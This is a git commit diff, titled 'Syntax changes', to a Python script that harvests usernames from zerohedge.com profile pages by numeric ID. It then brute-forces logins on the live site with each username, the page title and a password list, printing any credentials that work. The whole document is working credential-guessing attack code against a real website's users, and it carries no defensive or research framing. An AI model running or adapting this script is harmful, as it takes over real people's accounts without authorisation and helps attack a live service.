2a8f27cbca98a2bcc242ba966d9777f329da6fce
Jacob Allen Utley <jacob@halfinjest.com>
2017-06-14 12:39:22 -0500

    Syntax changes.

--- attempt.py
+++ attempt.py
@@ -3,15 +3,15 @@ import sys
 import time
 from space import *
 
-def attempt(number, username, title, passwords):
+def attempt(entry, passwords):
 	try:
-		for item in [username, title] + passwords:
-			data = {"form_id": "user_login", "name": username, "pass": item}
+		for item in [entry[1], entry[2]] + passwords:
+			data = {"form_id": "user_login", "name": entry[1], "pass": item}
 			response = requests.post("http://zerohedge.com/user/", data).text
 			if "/user/password" not in response:
-				sys.stdout.write(str(number) + \
-					space("number", len(str(number))) + username + \
-					space("username", len(username)) + item + "\n")
+				sys.stdout.write(str(entry[0]) + \
+					space("number", len(str(entry[0]))) + entry[1] + \
+					space("username", len(entry[1])) + item + "\n")
 				sys.stdout.flush()
 				exit()
 	except Exception as error: time.sleep(1)
--- evaluate.py
+++ evaluate.py
@@ -4,13 +4,14 @@ from attempt import *
 
 def evaluate(number, passwords):
 	try:
+		entry = [number]
 		request = urllib2.Request("http://www.zerohedge.com/user/" + \
 			str(number))
 		response = urllib2.urlopen(request).read()
-		username = response[response.index("canonical") + \
-			48:response.index("revisit-after") - 17]
-		title = response[response.index("<title>") + \
-			7:response.index(" | Zero Hedge")]
+		entry.append(response[response.index("canonical") + \
+			48:response.index("revisit-after") - 17])
+		entry.append(response[response.index("<title>") + \
+			7:response.index(" | Zero Hedge")])
 		threading.Thread(target=attempt,
-			args=(number, username, title, passwords)).start()
+			args=(entry, passwords)).start()
 	except Exception as error: pass
